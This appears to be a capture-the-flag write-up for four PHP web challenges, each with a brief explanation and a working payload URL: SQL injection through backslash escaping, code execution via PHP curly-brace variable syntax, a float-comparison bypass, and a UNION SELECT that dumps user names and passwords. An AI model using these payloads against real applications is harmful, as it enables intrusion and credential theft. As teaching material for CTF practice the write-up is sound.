# 4 php challenges and their payloads


# challenge1:

htmlentities() escapes single quotes and double quotes, but ignores backslashes, so you can use \ to escape the second single quote in the original SQL statement and successfully escape the quotes.

payload: http://nitectf/challenge1.php?username=\&password=%20or%201=1%20limit%201%23

# challenge2:

Usage of curly braces in PHP: foobar in the string ${foobar} will be treated as a variable, see: http://php.net/manual/en/language.variables.variable.php for details

payload: http://nitectf/challenge2.php?str=${${phpinfo()}}

# challenge3:

Make use of the different characteristics of floating point numbers in PHP and MySQL, in PHP 1.0000000000001 != 1 and in MySQL 1.0000000000001 == 1

payload: http://nitectf/challenge3.phpid=1.0000000000001

# challenge4:

The code in foreach avoids the occurrence of variable overwriting, but it may also cause the original variable to be released. By passing the parameter $_CONFIG=anything to release the $_CONFIG variable, thereby bypassing the filter, the rest is SQL injection.

payload: http://nitectf/challenge4.php?kw='%20and%200%20union%20select%20name,pass%20from%20users%20where%20id=1%23&_CONFIG=aaa
